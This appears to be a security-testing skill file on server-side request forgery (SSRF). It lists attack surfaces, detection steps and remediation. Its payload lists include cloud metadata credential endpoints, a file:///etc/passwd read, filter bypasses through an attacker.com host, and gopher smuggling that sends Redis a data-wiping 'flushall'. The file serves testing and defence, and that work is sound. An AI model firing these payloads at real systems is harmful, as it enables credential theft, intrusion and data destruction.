---
name: ssrf
description: Server-Side Request Forgery detection and exploitation techniques
---

# Server-Side Request Forgery (SSRF)

## Attack Surface

- URL parameters that fetch remote resources (webhooks, image URLs, PDF generators)
- File import/export features (CSV import from URL, RSS feeds)
- API integrations that accept user-supplied endpoints
- HTML-to-PDF renderers (wkhtmltopdf, headless Chrome)
- SVG/XML file upload with external entity references
- OAuth callback URLs and redirect parameters

## Detection Techniques

- Supply external collaborator/webhook URL and monitor for callbacks
- Test internal IP ranges: `127.0.0.1`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- Probe cloud metadata endpoints (AWS, GCP, Azure)
- Check for DNS rebinding by using short-TTL domains
- Observe response differences between valid internal and external targets
- Test URL parser inconsistencies (backslash, fragment, credentials in URL)

## Common Payloads

### Internal Network Probing
```
http://127.0.0.1:80
http://localhost:8080/admin
http://[::1]/
http://0x7f000001/
http://2130706433/
http://017700000001/
http://127.1/
```

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Filter Bypass
```
http://127.0.0.1.nip.io/
http://spoofed.burpcollaborator.net/  (DNS rebinding)
http://127.0.0.1:80@attacker.com/
http://attacker.com#@127.0.0.1/
gopher://127.0.0.1:25/xHELO%20localhost
file:///etc/passwd
dict://127.0.0.1:6379/INFO
```

### Protocol Smuggling
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
gopher://127.0.0.1:11211/_stats%0d%0a
```

## Remediation

- Allowlist permitted destination hosts/IPs and protocols (http/https only)
- Block requests to private IP ranges and link-local addresses at the network level
- Disable unnecessary URL schemes (file://, gopher://, dict://)
- Validate and resolve DNS before making requests; re-check after redirect
- Use a dedicated egress proxy for server-side HTTP requests
- Disable cloud metadata endpoint access from application containers (IMDSv2)

## References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
